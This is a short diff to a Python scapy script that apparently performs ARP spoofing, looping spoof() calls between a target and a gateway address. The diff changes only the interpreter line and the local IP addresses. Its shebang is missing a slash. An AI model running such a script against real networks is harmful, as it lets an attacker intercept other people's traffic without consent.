@@ -1,4 +1,4 @@
-#!usr/bin/env python
+#!usr/bin/env python3
 import scapy.all as scapy
 import time
 
@@ -19,6 +19,6 @@ def spoof(targetIP, spoofIP):
     scapy.send(packet)
     
 while True:
-    spoof("192.168.100.100", "192.168.100.1")
-    spoof("192.168.100.1", "192.168.100.100")
+    spoof("192.168.42.254", "192.168.42.1")
+    spoof("192.168.42.1", "192.168.42.254")
     time.sleep(1)
